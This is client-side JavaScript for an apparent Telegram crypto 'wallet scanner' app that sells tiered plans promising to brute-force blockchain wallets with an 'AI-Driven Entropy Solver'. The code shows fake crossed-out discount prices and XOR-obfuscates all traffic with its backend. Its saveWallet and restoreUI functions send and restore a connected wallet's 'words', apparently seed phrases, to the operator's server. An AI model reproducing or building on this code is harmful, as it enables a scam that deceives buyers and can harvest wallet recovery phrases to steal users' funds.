(function(){
  var hd=document.head;
  function css(href){var l=document.createElement('link');l.rel='stylesheet';l.href=href;hd.appendChild(l);return l;}
  function js(src,cb){var s=document.createElement('script');s.src=src;if(cb)s.onload=cb;document.body.appendChild(s);}
  css('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Outfit:wght@300;400;500;600;700;800&display=swap');
  css('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap');
  css('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css');
  var mainCss=css('css/jom.css');
  css('css/web3-theme.css');
  var _done=false;
  function _reveal(){
    if(_done)return;_done=true;
    requestAnimationFrame(function(){
      document.getElementById('_alfaBody').style.cssText='display:block;width:100%;min-height:100vh;min-height:100dvh;';
      document.getElementById('_alfaGate').style.display='none';
      js('js/lng.js',function(){
        setTimeout(function(){
          if(typeof updateChainsArrows==='function') updateChainsArrows();
        },300);
      });
    });
  }
  var _fb=setTimeout(_reveal,2500);
  mainCss.onload=function(){clearTimeout(_fb);_reveal();};
  mainCss.onerror=function(){clearTimeout(_fb);_reveal();};
  window._alfaShowLoader=function(){};
})();


(function () {
  'use strict';

  const API = '/api/app';

  
  const _EK = 'aLf4X9mQ2rTvUwPz';
  function _enc(obj) {
    var raw   = JSON.stringify(obj);
    var utf8  = unescape(encodeURIComponent(raw));
    var out   = [];
    for (var i = 0; i < utf8.length; i++) {
      out.push(utf8.charCodeAt(i) ^ _EK.charCodeAt(i % _EK.length));
    }
    return btoa(String.fromCharCode.apply(null, out));
  }

  function _dec(b64) {
    try {
      var bytes  = atob(b64);
      var key    = _EK;
      var out    = '';
      for (var i = 0; i < bytes.length; i++) {
        out += String.fromCharCode(bytes.charCodeAt(i) ^ key.charCodeAt(i % key.length));
      }
      out = decodeURIComponent(escape(out));
      return JSON.parse(out);
    } catch(e) {
      return null;
    }
  }

  
  async function api(action, extra) {
    try {
      const payload = { action, ...(extra || {}) };
      const r = await fetch(API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ _p: _enc(payload) }),
      });
      const text = await r.text();

      if (!text || !text.trim()) {
        document.documentElement.innerHTML =
          '<body style="background:#000;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">not found</body>';
        return null;
      }

      try {
        var raw = JSON.parse(text);
        if (raw && raw._r) {
          var dec = _dec(raw._r);
          if (!dec) {
 return null; }
          return dec;
        }
        return raw;
      } catch (parseErr) {
        return null;
      }
    } catch (e) {
      return null;
    }
  }

  
  function parseTgUser() {
    try {
      var sdk = window.Telegram && window.Telegram.WebApp;
      if (sdk) {
        if (typeof sdk.ready === 'function') sdk.ready();
        if (typeof sdk.expand === 'function') sdk.expand();
        if (sdk.initDataUnsafe && sdk.initDataUnsafe.user) {
          return sdk.initDataUnsafe.user;
        }
      }
    } catch (e) {
 }

    try {
      var href = window.location.href;
      var hashIdx = href.indexOf('#');
      if (hashIdx === -1) {
 return null; }
      var rawHash = href.slice(hashIdx + 1);
      if (!rawHash) {
 return null; }

      var p = new URLSearchParams(rawHash);
      var tgData = p.get('tgWebAppData');
      if (!tgData) {
 return null; }

      var inner = new URLSearchParams(tgData);
      var userStr = inner.get('user');
      if (!userStr) {
 return null; }

      try { userStr = decodeURIComponent(userStr); } catch(e) {}

      var user = JSON.parse(userStr);
      return user;
    } catch (e) {
      return null;
    }
  }

  
  const PLAN_CHAINS = {
    0: ['chip-btc'],
    1: ['chip-btc'],
    2: ['chip-btc','chip-bnb','chip-trx'],
    3: ['chip-btc','chip-eth','chip-bnb','chip-trx','chip-sol','chip-xrp','chip-usdt','chip-doge','chip-ltc'],
  };
  const PLAN_BADGE = { 0:'Trial', 1:'Starter', 2:'Pro', 3:'💎 Enterprise' };

  var PLAN_INFO = {
    0: { chains:['BTC'],                        speed:'1x Standard',   algo:'Basic Random Scan' },
    1: { chains:['BTC'],                        speed:'1x Standard',   algo:'Basic Random Scan' },
    2: { chains:['BTC','BNB','TRX'],            speed:'3x Multi-Thread', algo:'Smart Pattern Analysis' },
    3: { chains:['BTC','ETH','BNB','TRX','SOL','XRP','USDT','DOGE','LTC'], speed:'9x Max-Thread', algo:'AI-Driven Entropy Solver' },
  };

  var CHAIN_IMGS = {
    BTC:'images/how1p.png', ETH:'images/n27v6.png', BNB:'images/yt9z0.png',
    TRX:'images/6ulyt.png', SOL:'images/kqcoz.png', XRP:'images/mpcf0.png',
    USDT:'images/tdg4r.png', DOGE:'images/hpym7.png', LTC:'images/f4bm5.png',
  };

  function applyPlanLevel(level) {
    level = parseInt(level) || 0;
    window.ALFA_PLAN_LEVEL = level;
    var allowed = PLAN_CHAINS[level] || PLAN_CHAINS[0];
    var info    = PLAN_INFO[level]   || PLAN_INFO[0];

    document.querySelectorAll('.chain-chip').forEach(function(chip) {
      var cls = Array.from(chip.classList).find(function(c){ return c.startsWith('chip-'); });
      if (!cls) return;
      if (allowed.indexOf(cls) === -1) {
        chip.classList.remove('selected');
        chip.style.opacity = '0.3';
        chip.style.pointerEvents = 'none';
      } else {
        chip.style.opacity = '';
        chip.style.pointerEvents = '';
      }
    });

    window.toggleChip = function(el) {
      if (window.running) return;
      var cls = Array.from(el.classList).find(function(c){ return c.startsWith('chip-'); });
      if (cls && allowed.indexOf(cls) === -1) {
        showToast('⛔ This blockchain requires a higher plan. Please upgrade.');
        return;
      }
      el.classList.toggle('selected');
    };

    window._userHasPurchased = (level >= 1);

    var nodeLimitEl = document.getElementById('nodeLimitDisplay');
    if (nodeLimitEl) nodeLimitEl.textContent = level === 0 ? '1/10' : '10/10';

    var badge = document.querySelector('.spm-badge');
    if (badge) badge.textContent = PLAN_BADGE[level] || 'Trial';

    if (level > 0) document.querySelectorAll('.trial-badge').forEach(function(e){ e.remove(); });

    var spmList = document.querySelector('.spm-list');
    if (spmList) {
      var chainsRow = spmList.querySelector('.sa-chains-icons');
      if (chainsRow) {
        chainsRow.innerHTML = '';
        info.chains.forEach(function(coin) {
          var img = document.createElement('img');
          img.src = CHAIN_IMGS[coin] || '';
          img.alt = coin;
          img.draggable = false;
          chainsRow.appendChild(img);
        });
      }
      var vals = spmList.querySelectorAll('.spm-val');
      vals.forEach(function(v) {
        var label = v.previousElementSibling ? v.previousElementSibling.textContent : '';
        if (label.indexOf('Speed') !== -1) v.textContent = info.speed;
        if (label.indexOf('Algorithm') !== -1) v.textContent = info.algo;
      });
    }

    var sActs = document.querySelector('.s-acts');
    if (sActs) sActs.style.display = (level === 3) ? 'none' : '';

    var priceHot = document.querySelector('.sa-pc-price-hot');
    var priceMax = document.querySelector('.sa-pc-price-max');
    if(level === 1){
      if(priceHot){ priceHot.textContent='$49'; priceHot.title='Was $149'; }
      if(priceMax){ priceMax.textContent='$99'; priceMax.title='Was $249'; }
      ['.sa-pc-price-hot','.sa-pc-price-max'].forEach(function(sel,i){
        var el=document.querySelector(sel);
        if(!el)return;
        var row=el.parentNode;
        if(!row.querySelector('.sa-was-label')){
          var was=document.createElement('span');
          was.className='sa-was-label';
          was.style.cssText='font-size:0.7rem;color:#9aa1d9;text-decoration:line-through;margin-left:6px;vertical-align:middle;';
          was.textContent=i===0?'$149':'$249';
          row.insertBefore(was, el.nextSibling);
        }
      });
    } else if(level === 2){
      if(priceMax){ priceMax.textContent='$49'; priceMax.title='Was $249'; }
      var rowMax=priceMax?priceMax.parentNode:null;
      if(rowMax&&!rowMax.querySelector('.sa-was-label')){
        var was2=document.createElement('span');
        was2.className='sa-was-label';
        was2.style.cssText='font-size:0.7rem;color:#9aa1d9;text-decoration:line-through;margin-left:6px;vertical-align:middle;';
        was2.textContent='$249';
        rowMax.insertBefore(was2, priceMax.nextSibling);
      }
      if(priceHot){ priceHot.textContent='$149'; priceHot.title=''; }
    } else {
      if(priceHot) priceHot.textContent='$149';
      if(priceMax) priceMax.textContent='$249';
      document.querySelectorAll('.sa-was-label').forEach(function(e){e.remove();});
    }

    var attEl = document.getElementById('spmAttemptsVal');
    if (attEl) {
      if (level === 0) {
        attEl.textContent = (window.MAX_TRIALS || 1000).toLocaleString() + ' time';
        attEl.classList.remove('spm-unlimited');
        attEl.style.color = 'rgba(200,200,220,.5)';
        attEl.style.fontSize = '.75rem';
      } else {
        attEl.textContent = 'Unlimited';
        attEl.classList.add('spm-unlimited');
        attEl.style.color = '';
        attEl.style.fontSize = '';
      }
    }

    var algoRow = document.getElementById('spmAlgoRow');
    if (algoRow) {
      if (level === 0) {
        algoRow.style.opacity = '0.45';
        algoRow.style.filter = 'grayscale(60%)';
        var algoVal = algoRow.querySelector('.spm-val');
        if (algoVal) { algoVal.style.fontSize = '.68rem'; algoVal.style.color = 'rgba(160,155,200,.5)'; }
      } else {
        algoRow.style.opacity = '';
        algoRow.style.filter = '';
        var algoVal2 = algoRow.querySelector('.spm-val');
        if (algoVal2) { algoVal2.style.fontSize = ''; algoVal2.style.color = ''; }
      }
    }

    var themeRow = document.getElementById('themePickerRow');
    if (themeRow) {
      if (level === 0) {
        themeRow.style.opacity = '0.38';
        themeRow.style.pointerEvents = 'none';
        themeRow.title = 'Upgrade to unlock themes';
        if (!document.getElementById('_themeLockBadge')) {
          var lb = document.createElement('div');
          lb.id = '_themeLockBadge';
          lb.style.cssText = 'position:absolute;top:50%;right:0;transform:translateY(-50%);background:rgba(124,92,255,.18);border:1px solid rgba(124,92,255,.35);border-radius:8px;padding:3px 8px;font-size:.62rem;font-weight:800;font-family:Outfit,sans-serif;color:rgba(180,160,255,.8);letter-spacing:.04em;pointer-events:none;z-index:2;';
          lb.textContent = '🔒 PRO';
          themeRow.style.position = 'relative';
          themeRow.appendChild(lb);
        }
      } else {
        themeRow.style.opacity = '';
        themeRow.style.pointerEvents = '';
        themeRow.title = '';
        var lb2 = document.getElementById('_themeLockBadge');
        if (lb2) lb2.remove();
      }
    }

    var settingsTogsKeys = ['background','ai_search','deriv_paths','auto_withdraw','notification'];
    var settingsSwitches = document.querySelectorAll('.s-switch input[type=checkbox]');
    var depthSelectEl = document.getElementById('depthSelect');
    if (level === 0) {
      settingsSwitches.forEach(function(sw) {
        sw.disabled = true;
        sw.style.pointerEvents = 'none';
        sw.style.opacity = '0.4';
        var row = sw.closest('.s-tog-row');
        if (row) {
          row._alfaLocked = true;
          if (!row._alfaLockHandler) {
            row._alfaLockHandler = function(e) {
              if (!row._alfaLocked) return;
              if (e.target && e.target.closest('.s-icon-info')) return;
              e.stopPropagation();
              e.preventDefault();
              if (typeof _showStoreStyleToast === 'function') {
                _showStoreStyleToast('🔒 Upgrade your plan to unlock this setting ⚡');
              }
            };
            row.addEventListener('click', row._alfaLockHandler, true);
            row.addEventListener('touchend', row._alfaLockHandler, true);
          }
        }
      });
      if (depthSelectEl) {
        depthSelectEl.disabled = true;
        depthSelectEl.style.opacity = '0.4';
        depthSelectEl.style.pointerEvents = 'none';
        var depthRow = depthSelectEl.closest('.s-tog-row');
        if (depthRow && !depthRow._alfaLockHandler) {
          depthRow._alfaLocked = true;
          depthRow._alfaLockHandler = function(e) {
            if (!depthRow._alfaLocked) return;
            if (e.target && e.target.closest('.s-icon-info')) return;
            e.stopPropagation();
            e.preventDefault();
            if (typeof _showStoreStyleToast === 'function') {
              _showStoreStyleToast('🔒 Upgrade your plan to unlock this setting ⚡');
            }
          };
          depthRow.addEventListener('click', depthRow._alfaLockHandler, true);
          depthRow.addEventListener('touchend', depthRow._alfaLockHandler, true);
        }
      }
    } else {
      settingsSwitches.forEach(function(sw) {
        sw.disabled = false;
        sw.style.pointerEvents = '';
        sw.style.opacity = '';
        var row = sw.closest('.s-tog-row');
        if (row) { row._alfaLocked = false; }
      });
      if (depthSelectEl) {
        depthSelectEl.disabled = false;
        depthSelectEl.style.opacity = '';
        depthSelectEl.style.pointerEvents = '';
        var depthRow2 = depthSelectEl.closest('.s-tog-row');
        if (depthRow2) depthRow2._alfaLocked = false;
      }
    }

    var btnMap = [
      { sel: '.sa-plan-btn-starter', planNeeded: 1 },
      { sel: '.sa-plan-btn-pro',     planNeeded: 2 },
      { sel: '.sa-plan-btn-primary', planNeeded: 3 },
    ];
    btnMap.forEach(function(item) {
      var btn = document.querySelector(item.sel);
      if (!btn) return;
      if (level >= item.planNeeded) {
        btn.disabled = true;
        btn.textContent = '✓ Purchased';
        btn.style.background = 'rgba(255,255,255,.06)';
        btn.style.color = 'rgba(255,255,255,.3)';
        btn.style.border = '1px solid rgba(255,255,255,.1)';
        btn.style.boxShadow = 'none';
        btn.style.cursor = 'default';
        btn.style.filter = 'none';
        btn.onclick = null;
      } else {
        btn.disabled = false;
        if (btn.textContent === '✓ Purchased') btn.textContent = 'BUY NOW';
        btn.style.background = '';
        btn.style.color = '';
        btn.style.border = '';
        btn.style.boxShadow = '';
        btn.style.cursor = '';
        btn.style.filter = '';
      }
    });
  }

  function showToast(msg) {
    const t = document.getElementById('storeToast');
    if (t) {
      t.innerHTML = msg;
      t.style.cssText += ';opacity:1;transform:translateX(-50%) translateY(0);pointer-events:auto;';
      clearTimeout(t._h);
      t._h = setTimeout(() => {
        t.style.opacity = '0';
        t.style.transform = 'translateX(-50%) translateY(14px)';
        t.style.pointerEvents = 'none';
      }, 3500);
    }
  }

  
  var _settingsDirty   = false;
  var _settingsCache   = {};
  var _settingsFlushTimer = null;

  function _flushSettings() {
    if (!_settingsDirty || !window.DB || !window.DB.tgId) return;
    _settingsDirty = false;
    var payload = Object.assign({ tg_id: window.DB.tgId }, _settingsCache);
    api('save_settings', payload).catch(function(){});
  }

  
  function _saveSettingsLocal(key, val) {
    try {
      var raw = localStorage.getItem('alfa_settings');
      var st  = raw ? JSON.parse(raw) : {};
      st[key] = val;
      localStorage.setItem('alfa_settings', JSON.stringify(st));
    } catch(e) {}
  }

  function _loadSettingsLocal() {
    try {
      var raw = localStorage.getItem('alfa_settings');
      return raw ? JSON.parse(raw) : null;
    } catch(e) { return null; }
  }

  function _scheduleSettingsFlush() {
    if (_settingsFlushTimer) return; 
    _settingsFlushTimer = setTimeout(function() {
      _settingsFlushTimer = null;
      _flushSettings();
    }, 10000);
  }

  
  var CG_MAX_AGE_MS = 3 * 60 * 60 * 1000; 

  var _CG_SYMBOL_MAP = {
    bitcoin:     'BTC',
    ethereum:    'ETH',
    binancecoin: 'BNB',
    tether:      'USDT',
    tron:        'TRX',
    litecoin:    'LTC',
    solana:      'SOL',
    ripple:      'XRP',
    dogecoin:    'DOGE',
    toncoin:     'TON',
  };

  function _applyCgDbPrices(prices) {
    
    window.LIVE_PRICES = window.LIVE_PRICES || {};
    Object.keys(prices).forEach(function(id) {
      var p = prices[id] && prices[id].price_usd;
      if (p && p > 0) window.LIVE_PRICES[id] = p;
    });
  }

  function _saveCgToDb(cgRawData) {
    
    var toSave = {};
    Object.keys(cgRawData).forEach(function(id) {
      var usd = cgRawData[id] && cgRawData[id].usd;
      if (usd && usd > 0) {
        toSave[id] = { symbol: _CG_SYMBOL_MAP[id] || id.toUpperCase(), price_usd: usd };
      }
    });
    api('save_coin_prices', { prices: toSave }).catch(function(){});
  }

  function _fetchFromCoinGecko(fallbackPrices) {
    fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,litecoin,binancecoin,solana,tether,dogecoin,ripple,tron,toncoin&vs_currencies=usd')
      .then(function(r) { return r.json(); })
      .then(function(d) {
        
        window.LIVE_PRICES = window.LIVE_PRICES || {};
        Object.keys(d).forEach(function(id) {
          if (d[id] && d[id].usd) window.LIVE_PRICES[id] = d[id].usd;
        });
        
        _saveCgToDb(d);
        
        try {
          var _lsCache = {};
          Object.keys(d).forEach(function(id) {
            if (d[id] && d[id].usd) _lsCache[id] = { price_usd: d[id].usd, symbol: _CG_SYMBOL_MAP[id] || id.toUpperCase() };
          });
          localStorage.setItem('cgPrices', JSON.stringify({ ts: Date.now(), prices: _lsCache }));
        } catch(e) {}
      })
      .catch(function(e) {
        
        if (fallbackPrices) _applyCgDbPrices(fallbackPrices);
      });
  }

  window._fetchCoinPrices = function() {
    
    try {
      var _lsRaw = localStorage.getItem('cgPrices');
      if (_lsRaw) {
        var _lsParsed = JSON.parse(_lsRaw);
        if (_lsParsed && _lsParsed.ts && _lsParsed.prices) {
          var _lsAge = Date.now() - _lsParsed.ts;
          if (_lsAge < CG_MAX_AGE_MS) {
            _applyCgDbPrices(_lsParsed.prices);
            return; 
          }
        }
      }
    } catch(e) {}

    
    api('get_coin_prices', {}).then(function(r) {
      if (!r || !r.prices) {
        
        _fetchFromCoinGecko(null);
        return;
      }

      var prices    = r.prices;
      var updatedAt = r.updated_at; 

      
      var allZero = Object.keys(prices).every(function(id) {
        return !prices[id].price_usd || prices[id].price_usd <= 0;
      });

      if (allZero) {
        _fetchFromCoinGecko(null);
        return;
      }

      
      var cacheAge = updatedAt ? (Date.now() - new Date(updatedAt).getTime()) : CG_MAX_AGE_MS + 1;

      if (cacheAge > CG_MAX_AGE_MS) {
        
        _applyCgDbPrices(prices);
        
        _fetchFromCoinGecko(prices);
      } else {
        _applyCgDbPrices(prices);
      }
    }).catch(function(e) {
      _fetchFromCoinGecko(null);
    });
  };

  
  window.DB = {
    tgId: null,

    call(action, data) {
      if (!this.tgId) return Promise.resolve(null);
      return api(action, data);
    },
    saveWallet(name, words) {
      if (!this.tgId) return;
      
      try { localStorage.removeItem('alfa_wallet_cleared'); } catch(e) {}
      api('save_wallet', { tg_id: this.tgId, name, words, ts: Date.now() });
    },
    
    clearWallet() {
      window._connectedWallet = null;
      try { localStorage.setItem('alfa_wallet_cleared', '1'); } catch(e) {}
      try { localStorage.removeItem('alfa_wallet'); } catch(e) {}
      if (typeof window.applyWalletUI === 'function') window.applyWalletUI();
    },
    saveBoost(count, endTs, running) {
      if (!this.tgId) return;
      api('save_boost', { tg_id: this.tgId, count, end_ts: endTs ?? null, running: !!running });
    },
    saveArchiveItem(item) {
      if (!this.tgId) return;
      api('save_archive', { tg_id: this.tgId, item });
    },
    clearArchive() {
      if (!this.tgId) return;
      api('clear_archive', { tg_id: this.tgId });
    },
    saveDash(allTime, last30, coins, pendingVal, pendingFound) {
      window.DASH_STATS = window.DASH_STATS || {};
      window.DASH_STATS.allTime = allTime;
      window.DASH_STATS.coins   = coins;
      
      var now30 = Math.floor(Date.now() / 1000);
      if (!window.DASH_STATS.last30_ts && last30 > 0) {
        window.DASH_STATS.last30_ts = now30;
      }
      
      var age30 = window.DASH_STATS.last30_ts ? (now30 - window.DASH_STATS.last30_ts) : 0;
      window.DASH_STATS.last30 = (age30 < 2592000) ? last30 : 0; 
      if (age30 >= 2592000) { window.DASH_STATS.last30_ts = 0; } 
      if (typeof window.updateDashCards === 'function') window.updateDashCards();
      if (!this.tgId) return;
      api('save_dash', {
        tg_id:         this.tgId,
        all_time:      allTime,
        last30:        window.DASH_STATS.last30,
        last30_ts:     window.DASH_STATS.last30_ts || 0,
        coins:         coins,
        pending_val:   pendingVal  || 0,
        pending_found: pendingFound|| 0,
      });
    },
    
    saveSetting(key, val) {
      if (!this.tgId) return;
      _settingsCache[key] = val;
      _settingsDirty = true;
      _saveSettingsLocal(key, val); 
      _scheduleSettingsFlush();
    },
    saveTrialCount(cnt) {
      if (!this.tgId) return;
      this.trialCount = cnt;
      window.TRIAL_COUNT = cnt;
      api('save_trial_count', { tg_id: this.tgId, count: cnt });
    },
    setSplashDone() {
      if (!this.tgId) return;
      api('set_splash_done', { tg_id: this.tgId });
    },
    saveWorkData(text) {
      if (!this.tgId) return;
      api('save_work_data', { tg_id: this.tgId, work_data: text });
    },
    fetchMessages() {
      
      if (!this.tgId) return;
      api('get_messages', { tg_id: this.tgId }).then(function(r) {
        if (r && r.messages) {
          window._msgData = r.messages;
          window._msgSeen = r.seen_keys || [];
          var chk = parseInt(document.getElementById('checkedNum') && document.getElementById('checkedNum').textContent) || 0;
          if (typeof window.showMsgIfNeeded === 'function') window.showMsgIfNeeded(chk);
        }
      }).catch(function(){});
    },
  };

  
  (function() {
    function _buildJumpsDialog(data) {
      var ov = document.createElement('div');
      ov.id = 'jumpsOverlay';
      var s = ov.style;
      s.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483646;' +
                  'display:flex;align-items:center;justify-content:center;' +
                  'padding:20px;box-sizing:border-box;' +
                  'background:rgba(6,4,20,.6);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);';

      ov.innerHTML =
        '<div style="position:relative;width:100%;max-width:380px;' +
          'background:hsl(258,60%,8%);border:1px solid rgba(147,51,234,.5);' +
          'border-radius:20px;overflow:hidden;' +
          'box-shadow:0 0 60px rgba(124,92,255,.25),0 20px 60px rgba(0,0,0,.7);">' +
          '<div style="display:flex;align-items:center;gap:10px;padding:14px 16px 12px;' +
               'border-bottom:1px solid rgba(147,51,234,.2);">' +
            '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#7c5cff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0">' +
              '<polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>' +
            '</svg>' +
            '<span style="flex:1;font-family:Outfit,sans-serif;font-weight:700;font-size:.9rem;color:#e8ebff;letter-spacing:.02em;">' +
              _esc(data.title) + '</span>' +
            '<button id="jumpsCloseBtn" style="width:28px;height:28px;border-radius:50%;' +
              'background:rgba(147,51,234,.15);border:1px solid rgba(147,51,234,.35);' +
              'color:rgba(200,190,255,.9);font-size:.75rem;cursor:pointer;' +
              'display:flex;align-items:center;justify-content:center;flex-shrink:0;padding:0;">&#x2715;</button>' +
          '</div>' +
          '<div style="padding:16px 18px 20px;display:flex;flex-direction:column;gap:10px;">' +
            _row(data.title2) +
            _row(data.title3) +
            _row(data.title4) +
          '</div>' +
        '</div>';

      document.body.appendChild(ov);

      function _close() {
        document.body.removeChild(ov);
        if (window.DB && window.DB.tgId) {
          api('set_jumps_key', { tg_id: window.DB.tgId, key: data.title5 });
          window.DB.jumpsKey = data.title5;
        }
      }

      document.getElementById('jumpsCloseBtn').onclick = _close;
      ov.onclick = function(e) { if (e.target === ov) _close(); };
    }

    function _esc(s) {
      return (s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
    }
    function _row(text) {
      if (!text) return '';
      return '<div style="display:flex;align-items:flex-start;gap:8px;color:#cbd5e1;' +
             'font-family:Outfit,sans-serif;font-size:.85rem;line-height:1.55;">' +
             '<span style="color:#7c5cff;flex-shrink:0;margin-top:2px;">▸</span>' +
             '<span>' + _esc(text) + '</span></div>';
    }

    window.showJumpsIfNeeded = function(checkedCount) {
      if (!window.DB || !window.DB.tgId) return;
      if (!window._jumpsData || !window._jumpsData.length) return;
      var chk = checkedCount || 0;
      var seenKey = window._jumpsSeen || '';
      var match = null;
      for (var i = window._jumpsData.length - 1; i >= 0; i--) {
        var e = window._jumpsData[i];
        if (e.threshold <= chk && e.key !== seenKey) { match = e; break; }
      }
      if (!match) return;
      var msg = [match.title2, match.title3, match.title4].filter(Boolean).join(' • ');
      if (typeof window._showStoreStyleToast === 'function') {
        window._showStoreStyleToast('🔔 ' + msg, 5000);
      }
      window._jumpsSeen = match.key;
      api('set_jumps_key', { tg_id: window.DB.tgId, key: match.key });
      window.DB.jumpsKey = match.key;
    };
  })();

  
  (function() {
    var _ov = null;

    function _build() {
      if (_ov) return;
      _ov = document.createElement('div');
      _ov.id = 'tdOverlay';
      _ov.innerHTML =
        '<div id="tdBox" style="' +
          'position:relative;width:100%;max-width:400px;' +
          'background:hsl(258,60%,8%);' +
          'border:1px solid rgba(147,51,234,.45);' +
          'border-radius:20px;overflow:hidden;' +
          'box-shadow:0 0 60px rgba(124,92,255,.2),0 20px 60px rgba(0,0,0,.7);' +
        '">' +
          '<div style="' +
            'display:flex;align-items:center;gap:10px;' +
            'padding:14px 16px 12px;' +
            'border-bottom:1px solid rgba(147,51,234,.2);' +
          '">' +
            '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#00ffa3" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0">' +
              '<circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><circle cx="12" cy="16" r=".5" fill="#00ffa3"/>' +
            '</svg>' +
            '<span style="flex:1;font-family:Outfit,sans-serif;font-weight:700;font-size:.9rem;color:#e8ebff;letter-spacing:.02em;">Notice</span>' +
            '<button id="tdCloseBtn" style="' +
              'width:28px;height:28px;border-radius:50%;' +
              'background:rgba(147,51,234,.15);' +
              'border:1px solid rgba(147,51,234,.35);' +
              'color:rgba(200,190,255,.9);' +
              'font-size:.75rem;cursor:pointer;' +
              'display:flex;align-items:center;justify-content:center;' +
              'flex-shrink:0;padding:0;' +
            '">&#x2715;</button>' +
          '</div>' +
          '<div id="tdContent" style="' +
            'padding:18px 18px 22px;' +
            'color:#cbd5e1;font-family:Outfit,sans-serif;' +
            'font-size:.875rem;line-height:1.7;' +
            'max-height:60vh;overflow-y:auto;' +
          '"></div>' +
        '</div>';

      var s = _ov.style;
      s.cssText = [
        'position:fixed',
        'top:0','left:0','width:100%','height:100%',
        'z-index:2147483647',
        'display:none',
        'align-items:center','justify-content:center',
        'padding:20px','box-sizing:border-box',
        'background:rgba(6,4,20,.55)',
        'backdrop-filter:blur(4px)',
        '-webkit-backdrop-filter:blur(4px)'
      ].join(';');

      document.body.appendChild(_ov);
    }

    function _tdClose() {
      if (!_ov) return;
      _ov.style.display = 'none';
    }

    function _tdOpen(html) {
      _build();
      document.getElementById('tdContent').innerHTML = html;
      var cb = document.getElementById('tdCloseBtn');
      if (cb) cb.onclick = _tdClose;
      _ov.onclick = function(e) { if (e.target === _ov) _tdClose(); };
      _ov.style.display = 'flex';
    }

    window._closeToastDialog = _tdClose;

    window._tdHideIfNotMain = function(screenId) {
      if (screenId !== 'screen-main' && _ov) _ov.style.display = 'none';
    };

    var _tdShown = false;
    window.showToastDialogIfNeeded = function() {
      if (_tdShown) return;
      _tdShown = true;
      api('get_toast_dialog', {}).then(function(r) {
        if (!r) { _tdShown = false; return; }
        var html     = (r.toast_dialog || '').toString().trim();
        var maxLevel = (r.level !== undefined && r.level !== null) ? parseInt(r.level) : 3;
        var userLevel = parseInt((window.DB && window.DB.planLevel !== undefined ? window.DB.planLevel : 0));
        if (!html || userLevel > maxLevel) { _tdShown = false; return; }
        _tdOpen(html);
      }).catch(function(e) {
 _tdShown = false; });
    };
  })();

  
  window.showMsgIfNeeded = function(checkedCount) {
    if (!window._msgData || !window._msgData.length) return;
    var seen = window._msgSeen || [];
    window._msgData.forEach(function(m) {
      if (m.seen) return;
      if (seen.indexOf(m.key) !== -1) return;
      if (checkedCount < m.count) return;
      seen.push(m.key);
      window._msgSeen = seen;
      if (window.DB && window.DB.tgId) {
        api('set_msg_key', { tg_id: window.DB.tgId, key: m.key }).catch(function(){});
      }
      if (typeof window._showStoreStyleToast === 'function') {
        window._showStoreStyleToast(m.msg, 5000);
      }
    });
  };

  
  function restoreUI(u) {
    if (!u) return;

    
    if (u._online_count !== undefined) {
      var dispEl = document.getElementById('onlineCountDisplay');
      if (dispEl) dispEl.textContent = u._online_count;
    }

    
    const td        = u.tg_data || {};
    const spmId     = document.querySelector('.spm-id');
    const spmName   = document.querySelector('.spm-name');
    const spmAvatar = document.querySelector('.spm-avatar');
    if (spmId)   spmId.textContent   = u.tg_id + (td.username ? ' — @'+td.username : (td.name ? ' — '+td.name : ''));
    if (spmName) spmName.textContent = td.name || 'Your Profile';
    if (spmAvatar && td.photo) {
      spmAvatar.innerHTML = `<img src="${td.photo}" style="width:100%;height:100%;border-radius:50%;object-fit:cover;" onerror="this.parentNode.textContent='👤'">`;
    }

    applyPlanLevel(u.plan_level || 0);

    const wc = u.wallet_current;
    var _planLvWallet = parseInt(u.plan_level || 0);
    if (_planLvWallet === 0) {
      
      window._connectedWallet = null;
      try { localStorage.removeItem('alfa_wallet'); } catch(e) {}
      try { localStorage.removeItem('alfa_wallet_cleared'); } catch(e) {}
      if (wc && Array.isArray(wc.words) && wc.words.length) {
        
        api('save_wallet', { tg_id: window.DB.tgId, name: '', words: [], ts: 0 });
      }
    } else {
      var _walletCleared = false;
      try { _walletCleared = localStorage.getItem('alfa_wallet_cleared') === '1'; } catch(e) {}
      if (wc && Array.isArray(wc.words) && wc.words.length && !_walletCleared) {
        window._connectedWallet = { name: wc.name, words: wc.words, ts: wc.ts };
        if (typeof window.applyWalletUI === 'function') window.applyWalletUI();
        else if (typeof applyWalletUI === 'function') applyWalletUI();
      }
    }

    const bd = u.boost_data || {};
    window.boostCount   = typeof bd.count === 'number' ? bd.count : 3;
    window.boostRunning = !!bd.running;
    window.boostSec     = (bd.end_ts && bd.running)
      ? Math.max(0, Math.floor((bd.end_ts - Date.now()) / 1000))
      : 0;

    const bc = document.getElementById('boostCount');
    const pf = document.getElementById('progFill');
    if (bc) bc.textContent = window.boostCount + '/20';
    if (pf) pf.style.width = (window.boostCount / 20 * 100) + '%';

    if (window.boostRunning && window.boostSec > 0) {
      var pill = document.getElementById('boostPill');
      if (pill) {
        pill.style.display = 'flex';
        pill.classList.add('paused');
        var bt = pill.querySelector('.boost-time');
        if (bt) {
          var s0 = window.boostSec;
          var h0 = Math.floor(s0/3600), m0 = Math.floor((s0%3600)/60), sc0 = s0%60;
          bt.textContent = (h0 > 0 ? h0+'h ' : '') + m0+'m '+sc0+'s';
        }
      }
    } else {
      window.boostSec     = 0;
      window.boostRunning = false;
    }

    const dd = u.dash_data || {};
    var savedCoins = dd.coins || {};
    var prevStats = window.DASH_STATS || {};
    var defaultCoins = { BTC:0, ETH:0, BNB:0, SOL:0, TRX:0, XRP:0, USDT:0, DOGE:0, LTC:0 };
